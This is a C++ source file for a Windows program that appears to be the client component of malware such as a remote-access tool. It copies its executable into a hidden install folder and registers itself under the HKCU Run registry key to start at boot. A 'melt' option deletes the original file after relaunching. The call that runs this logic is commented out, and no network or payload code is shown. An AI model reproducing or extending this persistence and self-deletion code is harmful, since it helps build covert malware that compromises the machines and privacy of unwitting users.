/*

					SETTINGS CAN BE EDITED IN "settings.cpp"

*/
#define WIN32_LEAN_AND_MEAN

#include "includes.h"




//TESTFUNC

void testMB(std::string s)		//TEST FUNCTION
{
	MessageBox(0, s.c_str(), "THIS IS A TEST", 0);
}

//END TESTFUNC



void setLocation()			//sets location(copies file)
{
	if (!General::directoryExists(installFolder.c_str()))
		if (!CreateDirectory(installFolder.c_str(), NULL))	//tries to create folder		
		{
																						//[MAYBE DO SOMETHING LATER IF IT FAILS - PERHAPS REROUTE INSTALL TO APPDATA]
		}
	CopyFile(currentPath.c_str(), installPath.c_str(), 0);
}



bool locationSet()		//checks if executable is located in install position
{
	if (currentPath == installPath)
		return true;
	else
		return false;
}

bool startupSet()		//checks if executable is starting on boot
{
	if (General::regValueExists(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings::startupName.c_str()))
		return true;
	else
		return false;
}

bool installed()		//checks if executable is installed properly (location + startup)
{
	if (startupSet() && locationSet())
		return true;
	else
		return false;
}

void installCheck()		//checks if this run of the program is designated to the install process, then checks whether it should start the installed client
{
	if (installing)
		if (!Settings::startOnNextBoot)
		{
			General::startProcess(installPath.c_str(), Settings::meltSelf ? convStringToLPTSTR("t " + currentPath) : NULL);		//REPLACE NULL TO, "meltSelf ? 'CURRENTPATH' : NULL"	WHEN CREATEPROCESS FIXED
		}

}

bool init()		//startup of program
{
	//VARIABLE SETUP
	currentPath = General::getCurrentPath();
	installFolder = General::getInstallFolder();
	installPath = General::getInstallPath(installFolder);



	if (!(lpArguments == NULL || (lpArguments[0] == 0)) && Settings::meltSelf)		//checks if arguments are supplied (path of old file) and then melts given file (if any)
	{
		remove(lpArguments);
	}

	if (Settings::installSelf)
	{
		if (!locationSet())				//checks if it is at it's destined location (config in settings.h)
		{
			setLocation();
			installing = true;
		}
	}

	if (Settings::setStartupSelf)
	{
		if (!startupSet())				//checks if it's startup is set
		{
			General::setStartup(convStringToWidestring(Settings::startupName).c_str(), Settings::installSelf ? convStringToWidestring(installPath).c_str() : convStringToWidestring(currentPath).c_str(), NULL);
		}
	}
	

	installCheck();			//checks if this run of the program is designated to the install process, then checks whether it should start the installed client


	return installing;
}




int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
{
	//VARIABLE SETUP
	lpArguments = lpCmdLine;

	/*
	if (init())
		return 0;
	*/
	//test stuff (WORKS \o/)

	return 0;
}